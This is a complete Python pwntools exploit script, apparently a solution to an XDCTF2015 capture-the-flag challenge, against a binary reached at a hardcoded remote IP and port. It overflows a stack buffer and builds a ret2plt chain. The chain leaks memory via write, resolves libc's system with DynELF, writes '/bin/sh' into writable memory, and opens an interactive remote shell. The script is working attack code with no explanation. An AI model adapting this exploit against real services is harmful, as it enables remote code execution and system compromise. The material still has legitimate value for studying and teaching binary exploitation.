from pwn import *
from binascii import *

func = 0x08048484
main = 0x080484BE
write_plt = 0x080483C0
read_plt = 0x08048390
read_got = 0x0804A004
#data_addr = 0x804A044
data_addr = 0x804A014



f = open('input', 'w')

#r = process("./c1")
r = remote('133.130.111.139', 2333)

def leak(addr):
	print r.recvuntil("XDCTF2015~!")
	payload  = ''
	payload += "A"*0x6c
	payload += "BBBB"
	payload += p32(write_plt)
	payload += p32(main)
	payload += p32(1)
	payload += p32(addr)
	payload += p32(4)
	r.sendline(payload)
	data = r.recv(4)
	data = r.recv(4)
	print 'addr',hex(addr),'=>',hex(u32(data))
	return data

def write_addr(addr, cont, system_addr):
	print r.recvuntil("XDCTF2015~!")
	payload  = ''
	payload += "C"*0x6c
	payload += "DDDD"
	payload += p32(read_plt)
	payload += p32(system_addr)
	payload += p32(0)
	payload += p32(addr)
	payload += p32(len(cont))
	payload = payload.ljust(0x100, 'E')
	payload += cont
	r.sendline(payload)
	f.write(payload+'\n')

d = DynELF(leak, elf=ELF('./c1'))
system_addr = d.lookup('system','libc')
print "system_addr=" + hex(system_addr)
write_addr(data_addr, '/bin/sh', system_addr)


f.close()
r.interactive()
